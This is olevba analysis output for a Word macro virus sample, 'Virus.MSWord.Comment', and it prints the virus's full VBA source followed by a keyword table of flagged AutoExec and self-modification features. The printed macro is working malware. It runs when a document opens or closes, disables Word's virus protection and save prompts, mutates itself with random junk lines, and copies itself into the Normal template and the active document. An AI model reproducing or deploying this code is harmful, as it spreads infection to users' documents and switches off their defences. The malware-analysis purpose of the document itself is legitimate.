olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Comment-05db634f40cac01c61a50603d570c1ea677cb318
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Comment-05db634f40cac01c61a50603d570c1ea677cb318 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Comment-05db634f40cac01c61a50603d570c1ea677cb318 - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Call Comment
End Sub
Private Sub Document_Close()
Call Comment
End Sub
Private Sub Comment()
For V1 = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1), 1, 1) = "'" Then
V2 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1)
V3 = (Mid(V2, 2, Len(V2)))
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline V1, V3
End If
Next V1
CommentMacro = By_Lys_Kovick
If ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 150 Then
For W4 = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
W5 = Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(W4, 1), 1, 3)
If W5 = "Rem" Then ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines W4, 1
Next W4
End If
For W2 = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(W2, 1) = "CommentMacro = By_Lys_Kovick" Then
W3 = W2
GoTo GotIt
End If
Next W2
GotIt:
For V4 = W3 + 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1
V5 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V4, 1)
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline V4, "'" & V5
Next V4
For V5 = 1 To 20
V6 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
V7 = Int(Rnd() * V6 + 1)
V8 = Int(Rnd() * 99 + 1)
For V9 = 1 To V8
W1 = W1 + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next V9
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines V7, "Rem " & W1
W1 = ""
Next V5
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0
VM = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
NT.DeleteLines 1, NT.CountOfLines
NT.AddFromString VM
Set AD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
AD.DeleteLines 1, AD.CountOfLines
AD.AddFromString VM
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

